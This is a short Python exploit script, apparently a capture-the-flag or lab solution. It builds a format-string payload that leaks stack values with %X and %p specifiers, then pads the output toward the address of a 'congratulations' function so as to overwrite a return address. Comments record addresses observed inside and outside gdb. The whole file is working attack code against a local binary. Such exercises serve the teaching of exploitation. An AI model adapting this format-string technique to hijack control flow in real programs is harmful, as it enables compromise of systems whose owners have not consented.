#!/usr/bin/python3

import sys
import struct

ptr = 0x7fffffffe618
advance = int(sys.argv[1], 10)
ret = struct.pack("Q", ptr + advance)

# 0000000000400674 <congratulations>:
congrats = 0x400674

payload = ""
payload += "%X " * 8
payload += "%p" # here lies ret ptr

payload += "%X " * 9
payload += "%" + str(congrats - len(payload) - 79) + "d"
payload += "%p"

#ret = "\x68\xe6\xff\xff\xff\x7f\x00\x00" # addr of ret addr
# 0x7ffff7ffdc0c 0x7ffff7ffb300 0x7ffff7dc2617 0 0 0 0x7fffffffd690 0x7fffffffe690 0x4006e5

#ret = "\x18\xd6\xff\xff\xff\x7f\x00\x00" # addr of ret addr in gdb
# 0x7ffff7ffdc0c 0x7ffff7ffb300 0x7ffff7dc2617 0 0 0 0x7fffffffd650 0x7fffffffe650 0x4006e5

sys.stdout.buffer.write(payload.encode('ascii') + ret)

